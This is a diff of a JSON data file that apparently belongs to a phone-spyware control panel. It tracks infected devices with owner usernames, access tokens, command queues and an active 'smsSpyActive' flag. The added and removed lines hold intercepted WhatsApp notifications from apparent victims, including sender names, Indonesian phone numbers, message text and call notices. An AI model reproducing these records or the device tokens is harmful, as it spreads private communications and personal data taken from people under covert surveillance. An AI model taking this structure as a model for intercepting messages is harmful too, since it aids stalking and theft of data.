@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776917295885,
+    "lastSeen": 1776917307891,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "23/04 12:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917310486
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 09:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1776906650857
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-3406-5819",
-        "content": "Oke",
-        "time": "23/04 09:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906650757
       }
     ],
     "galleryPhotos": [],
@@ -9972,6 +9972,14 @@
       {
         "appName": "WhatsApp",
         "sender": "+62 813-7884-5940",
+        "content": "Panggilan telepon berlangsung",
+        "time": "23/04 12:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917297032
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 813-7884-5940",
         "content": "Telepon suara masuk",
         "time": "23/04 12:08",
         "pkg": "com.whatsapp",
@@ -12290,7 +12298,7 @@
     "deviceName": "HP-AMBONV2-0FAF",
     "ownerUsername": "gehgtg17",
     "token": "7fbcd2650ba9cf5ce36f05d0004ee8a1",
-    "lastSeen": 1776917295824,
+    "lastSeen": 1776917310360,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T23:50:06.977Z",
